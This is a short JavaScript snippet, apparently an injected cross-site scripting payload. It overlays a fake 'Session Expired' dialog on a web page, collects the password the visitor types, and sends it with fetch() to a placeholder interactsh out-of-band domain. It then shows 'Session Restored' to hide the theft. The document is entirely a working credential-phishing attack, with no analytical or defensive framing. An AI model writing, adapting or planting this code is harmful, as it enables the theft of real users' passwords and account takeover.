<script>
let overlay = document.createElement('div');
overlay.style.position = 'fixed';
overlay.style.top = 0;
overlay.style.left = 0;
overlay.style.width = '100%';
overlay.style.height = '100%';
overlay.style.background = 'rgba(0,0,0,0.5)';
overlay.style.zIndex = 999999;
overlay.style.display = 'flex';
overlay.style.alignItems = 'center';
overlay.style.justifyContent = 'center';
overlay.innerHTML = `
  <div style="background:white;padding:20px;border-radius:6px;text-align:center;font-family:sans-serif;max-width:300px;box-shadow:0 0 10px rgba(0,0,0,0.3);">
    <h3>Session Expired</h3>
    <p>Please re-enter your password</p>
    <input type="password" id="pw" style="width:100%;padding:6px;margin-top:8px;">
    <button id="submit" style="margin-top:10px;padding:6px 12px;">Continue</button>
  </div>
`;
document.body.appendChild(overlay);

document.getElementById('submit').onclick = () => {
    let pw = document.getElementById('pw').value;
    fetch("https://YOUR-INTERACTSH-DOMAIN.interactsh.com/pass?pwd=" + encodeURIComponent(pw))
    .catch(()=>{});
    overlay.innerHTML = `<div style="color:white;font-size:18px;">Session Restored...</div>`;
    setTimeout(()=>overlay.remove(),1500);
};
</script>
